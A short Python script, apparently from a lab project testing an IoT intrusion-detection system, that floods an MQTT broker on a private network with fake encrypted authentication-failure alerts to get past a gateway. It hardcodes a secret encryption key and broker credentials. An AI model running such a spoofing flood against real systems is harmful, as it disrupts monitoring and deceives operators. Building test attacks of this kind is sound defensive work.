import time
import json
import random
import os
import paho.mqtt.client as mqtt
import cypher

# Définition de la clé pour chiffrer
os.environ['IDS_SECRET_KEY'] = 'JKp-xlgYazhuZZRf2R1c6_xj-6Jhz2kYXwEn8ydy5zc='

BROKER = "192.168.50.171"
PORT = 1883
TOPIC = "cyberspace/capteurs/salle-serveur"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, "HackedSensor_Debian")
client.username_pw_set("v-client", "secret_iot_2026")
client.connect(BROKER, PORT)

print("🚀 Démarrage de l'attaque Brute Force (Auth Failure Spam)...")

try:
    while True:
        payload = {
            "type": "AUTH_FAILURE",
            "device": "sas",
            "ip": "192.168.50.42",
            "message": "Invalid credentials",
            "temp": random.randint(150, 999)
        }
        
        # Envoi d'une fausse alerte chiffrée pour bypasser la passerelle
        client.publish(TOPIC, cypher.encrypt_message("sas", payload))
        print(f"💥 Spam Brute Force : {payload}")
        
        time.sleep(0.1)
        
except KeyboardInterrupt:
    print("\n🛑 Attaque interrompue par l'utilisateur.")
    client.disconnect()
